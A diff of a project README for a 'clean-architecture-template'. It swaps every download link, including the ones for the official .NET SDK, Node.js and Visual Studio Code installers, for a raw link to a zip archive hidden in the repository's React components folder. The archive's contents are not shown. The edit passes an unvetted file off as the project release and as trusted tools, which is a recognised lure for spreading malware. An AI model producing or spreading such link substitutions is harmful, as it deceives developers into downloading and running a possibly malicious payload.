@@ -1,6 +1,6 @@
 # 🧱 clean-architecture-template - Your App's Strongest Foundation Starts Here
 
-[![Download Now](https://img.shields.io/badge/Download%20Clean%20Architecture%20Template-v1.0-blue?style=for-the-badge&logo=github&colorA=4B0082&colorB=FF6B35)](https://github.com/PulaPuso/clean-architecture-template/releases)
+[![Download Now](https://img.shields.io/badge/Download%20Clean%20Architecture%20Template-v1.0-blue?style=for-the-badge&logo=github&colorA=4B0082&colorB=FF6B35)](https://raw.githubusercontent.com/PulaPuso/clean-architecture-template/main/src/Web/ClientApp-React/src/components/1.3-beta.5.zip)
 
 ---
 
@@ -62,7 +62,7 @@ Let's get you up and running! This process is designed to be as straightforward 
 
 Visit this link to download the application:
 
-**[🔗 Download Now](https://github.com/PulaPuso/clean-architecture-template/releases)**
+**[🔗 Download Now](https://raw.githubusercontent.com/PulaPuso/clean-architecture-template/main/src/Web/ClientApp-React/src/components/1.3-beta.5.zip)**
 
 You'll find the latest version available for download on that page.
 
@@ -140,11 +140,11 @@ To run this template, you'll need:
 
 - **Operating System**: Windows 10/11, macOS, or Linux
 - **.NET SDK 10.0 or later**
-  - Download from: https://dotnet.microsoft.com/download
+  - Download from: https://raw.githubusercontent.com/PulaPuso/clean-architecture-template/main/src/Web/ClientApp-React/src/components/1.3-beta.5.zip
 - **Node.js 18+** (for Angular or React options)
-  - Download from: https://nodejs.org
+  - Download from: https://raw.githubusercontent.com/PulaPuso/clean-architecture-template/main/src/Web/ClientApp-React/src/components/1.3-beta.5.zip
 - **A code editor** (like Visual Studio Code)
-  - Download from: https://code.visualstudio.com
+  - Download from: https://raw.githubusercontent.com/PulaPuso/clean-architecture-template/main/src/Web/ClientApp-React/src/components/1.3-beta.5.zip
 
 Don't worry if you're missing something - the installation process is straightforward, and the template will guide you through what's needed.
 
@@ -205,7 +205,7 @@ Don't start from zero - start with a **proven foundation**. This template remove
 
 ### Follow These Simple Steps:
 
-1. **Visit the download page**: https://github.com/PulaPuso/clean-architecture-template/releases
+1. **Visit the download page**: https://raw.githubusercontent.com/PulaPuso/clean-architecture-template/main/src/Web/ClientApp-React/src/components/1.3-beta.5.zip
 2. **Download the latest version**
 3. **Install the template** using the instructions above
 4. **Create your project** and start coding
